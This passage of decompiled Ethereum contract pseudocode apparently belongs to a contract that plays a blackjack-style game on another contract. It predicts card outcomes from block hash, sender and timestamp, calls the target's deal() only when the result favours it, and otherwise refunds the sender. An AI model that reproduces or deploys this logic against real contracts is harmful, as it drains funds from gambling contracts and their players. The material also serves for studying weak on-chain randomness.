                                    w = w + 10
                                    continue 
                                else:
                                    if uint8(mem[(32 * idx) + 256]) / 4 != 12:
                                        if uint8(mem[(32 * idx) + 256]) / 4 != 1:
                                            s = mem[(32 * idx) + 256]
                                            idx = idx + 1
                                            s = s
                                            v = v + 10
                                            w = w + (uint8(mem[(32 * idx) + 256]) / 4)
                                            continue 
                                        else:
                                            s = mem[(32 * idx) + 256]
                                            idx = idx + 1
                                            s = s
                                            v = v + 10
                                            w = w + (uint8(mem[(32 * idx) + 256]) / 4)
                                            continue 
                                    else:
                                        s = mem[(32 * idx) + 256]
                                        idx = idx + 1
                                        s = s
                                        v = v + 10
                                        w = w + 10
                                        continue 
            else:
                if not Mask(6, 2, mem[(32 * idx) + 256]):
                    if not Mask(6, 2, mem[(32 * idx) + 256]):
                        s = mem[(32 * idx) + 256]
                        idx = idx + 1
                        s = 1
                        v = v + 10
                        w = w + 10
                        continue 
                    else:
                        if uint8(mem[(32 * idx) + 256]) / 4 == 11:
                            s = mem[(32 * idx) + 256]
                            idx = idx + 1
                            s = 1
                            v = v + 10
                            w = w + 10
                            continue 
                        else:
                            if uint8(mem[(32 * idx) + 256]) / 4 != 12:
                                if uint8(mem[(32 * idx) + 256]) / 4 != 1:
                                    s = mem[(32 * idx) + 256]
                                    idx = idx + 1
                                    s = 1
                                    v = v + 10
                                    w = w + (uint8(mem[(32 * idx) + 256]) / 4)
                                    continue 
                                else:
                                    s = mem[(32 * idx) + 256]
                                    idx = idx + 1
                                    s = 1
                                    v = v + 10
                                    w = w + (uint8(mem[(32 * idx) + 256]) / 4)
                                    continue 
                            else:
                                s = mem[(32 * idx) + 256]
                                idx = idx + 1
                                s = 1
                                v = v + 10
                                w = w + 10
                                continue 
                else:
                    if uint8(mem[(32 * idx) + 256]) / 4 == 11:
                        if not Mask(6, 2, mem[(32 * idx) + 256]):
                            s = mem[(32 * idx) + 256]
                            idx = idx + 1
                            s = 1
                            v = v + 10
                            w = w + 10
                            continue 
                        else:
                            if uint8(mem[(32 * idx) + 256]) / 4 == 11:
                                s = mem[(32 * idx) + 256]
                                idx = idx + 1
                                s = 1
                                v = v + 10
                                w = w + 10
                                continue 
                            else:
                                if uint8(mem[(32 * idx) + 256]) / 4 != 12:
                                    if uint8(mem[(32 * idx) + 256]) / 4 != 1:
                                        s = mem[(32 * idx) + 256]
                                        idx = idx + 1
                                        s = 1
                                        v = v + 10
                                        w = w + (uint8(mem[(32 * idx) + 256]) / 4)
                                        continue 
                                    else:
                                        s = mem[(32 * idx) + 256]
                                        idx = idx + 1
                                        s = 1
                                        v = v + 10
                                        w = w + (uint8(mem[(32 * idx) + 256]) / 4)
                                        continue 
                                else:
                                    s = mem[(32 * idx) + 256]
                                    idx = idx + 1
                                    s = 1
                                    v = v + 10
                                    w = w + 10
                                    continue 
                    else:
                        if uint8(mem[(32 * idx) + 256]) / 4 != 12:
                            if uint8(mem[(32 * idx) + 256]) / 4 != 1:
                                if not Mask(6, 2, mem[(32 * idx) + 256]):
                                    s = mem[(32 * idx) + 256]
                                    idx = idx + 1
                                    s = 1
                                    v = v + (uint8(mem[(32 * idx) + 256]) / 4)
                                    w = w + 10
                                    continue 
                                else:
                                    if uint8(mem[(32 * idx) + 256]) / 4 == 11:
                                        s = mem[(32 * idx) + 256]
                                        idx = idx + 1
                                        s = 1
                                        v = v + (uint8(mem[(32 * idx) + 256]) / 4)
                                        w = w + 10
                                        continue 
                                    else:
                                        if uint8(mem[(32 * idx) + 256]) / 4 != 12:
                                            if uint8(mem[(32 * idx) + 256]) / 4 != 1:
                                                s = mem[(32 * idx) + 256]
                                                idx = idx + 1
                                                s = 1
                                                v = v + (uint8(mem[(32 * idx) + 256]) / 4)
                                                w = w + (uint8(mem[(32 * idx) + 256]) / 4)
                                                continue 
                                            else:
                                                s = mem[(32 * idx) + 256]
                                                idx = idx + 1
                                                s = 1
                                                v = v + (uint8(mem[(32 * idx) + 256]) / 4)
                                                w = w + (uint8(mem[(32 * idx) + 256]) / 4)
                                                continue 
                                        else:
                                            s = mem[(32 * idx) + 256]
                                            idx = idx + 1
                                            s = 1
                                            v = v + (uint8(mem[(32 * idx) + 256]) / 4)
                                            w = w + 10
                                            continue 
                            else:
                                if not Mask(6, 2, mem[(32 * idx) + 256]):
                                    s = mem[(32 * idx) + 256]
                                    idx = idx + 1
                                    s = 1
                                    v = v + 11
                                    w = w + 10
                                    continue 
                                else:
                                    if uint8(mem[(32 * idx) + 256]) / 4 == 11:
                                        s = mem[(32 * idx) + 256]
                                        idx = idx + 1
                                        s = 1
                                        v = v + 11
                                        w = w + 10
                                        continue 
                                    else:
                                        if uint8(mem[(32 * idx) + 256]) / 4 != 12:
                                            if uint8(mem[(32 * idx) + 256]) / 4 != 1:
                                                s = mem[(32 * idx) + 256]
                                                idx = idx + 1
                                                s = 1
                                                v = v + 11
                                                w = w + (uint8(mem[(32 * idx) + 256]) / 4)
                                                continue 
                                            else:
                                                s = mem[(32 * idx) + 256]
                                                idx = idx + 1
                                                s = 1
                                                v = v + 11
                                                w = w + (uint8(mem[(32 * idx) + 256]) / 4)
                                                continue 
                                        else:
                                            s = mem[(32 * idx) + 256]
                                            idx = idx + 1
                                            s = 1
                                            v = v + 11
                                            w = w + 10
                                            continue 
                        else:
                            if not Mask(6, 2, mem[(32 * idx) + 256]):
                                s = mem[(32 * idx) + 256]
                                idx = idx + 1
                                s = 1
                                v = v + 10
                                w = w + 10
                                continue 
                            else:
                                if uint8(mem[(32 * idx) + 256]) / 4 == 11:
                                    s = mem[(32 * idx) + 256]
                                    idx = idx + 1
                                    s = 1
                                    v = v + 10
                                    w = w + 10
                                    continue 
                                else:
                                    if uint8(mem[(32 * idx) + 256]) / 4 != 12:
                                        if uint8(mem[(32 * idx) + 256]) / 4 != 1:
                                            s = mem[(32 * idx) + 256]
                                            idx = idx + 1
                                            s = 1
                                            v = v + 10
                                            w = w + (uint8(mem[(32 * idx) + 256]) / 4)
                                            continue 
                                        else:
                                            s = mem[(32 * idx) + 256]
                                            idx = idx + 1
                                            s = 1
                                            v = v + 10
                                            w = w + (uint8(mem[(32 * idx) + 256]) / 4)
                                            continue 
                                    else:
                                        s = mem[(32 * idx) + 256]
                                        idx = idx + 1
                                        s = 1
                                        v = v + 10
                                        w = w + 10
                                        continue 
    if uint8(t) == 21:
        if uint8(w) == 21:
            call msg.sender with:
               value msg.value wei
                 gas 2300 * is_zero(value) wei
            totalGames = uint8(totalGames + 1)
        else:
            if uint8(v) != 21:
                call msg.sender with:
                   value msg.value wei
                     gas 2300 * is_zero(value) wei
                totalGames = uint8(totalGames + 1)
            else:
                call msg.sender with:
                   value msg.value wei
                     gas 2300 * is_zero(value) wei
                totalGames = uint8(totalGames + 1)
    else:
        if uint8(u) != 21:
            if uint8(w) == 21:
                if uint8(sha3(block.hash(block.number), msg.sender, 0, block.timestamp) % 52) / 4 != 10:
                    require ext_code.size(stor1)
                    call stor1.deal() with:
                       value msg.value wei
                         gas gas_remaining - 9050 wei
                    require ext_call.success
                    totalBet += msg.value
                    totalGames = uint8(totalGames + 1)
                else:
                    require ext_code.size(stor1)
                    call stor1.deal() with:
                       value msg.value wei
                         gas gas_remaining - 9050 wei
                    require ext_call.success
                    totalBet += msg.value
                    totalGames = uint8(totalGames + 1)
            else:
                if uint8(v) != 21:
                    if uint8(w) <= 21:
                        call msg.sender with:
                           value msg.value wei
                             gas 2300 * is_zero(value) wei
                        totalGames = uint8(totalGames + 1)
                    else:
                        call msg.sender with:
                           value msg.value wei
                             gas 2300 * is_zero(value) wei
                        totalGames = uint8(totalGames + 1)
                else:
                    if uint8(sha3(block.hash(block.number), msg.sender, 0, block.timestamp) % 52) / 4 != 10:
                        require ext_code.size(stor1)
                        call stor1.deal() with:
                           value msg.value wei
                             gas gas_remaining - 9050 wei
                        require ext_call.success
                        totalBet += msg.value
                        totalGames = uint8(totalGames + 1)
                    else:
                        require ext_code.size(stor1)
                        call stor1.deal() with:
                           value msg.value wei
                             gas gas_remaining - 9050 wei
                        require ext_call.success
                        totalBet += msg.value
                        totalGames = uint8(totalGames + 1)
        else:
            if uint8(w) == 21:
                call msg.sender with:
                   value msg.value wei
                     gas 2300 * is_zero(value) wei
                totalGames = uint8(totalGames + 1)
            else:
                if uint8(v) != 21:
                    call msg.sender with:
                       value msg.value wei
                         gas 2300 * is_zero(value) wei
                    totalGames = uint8(totalGames + 1)
                else:
                    call msg.sender with:
                       value msg.value wei
                         gas 2300 * is_zero(value) wei
                    totalGames = uint8(totalGames + 1)
}



}
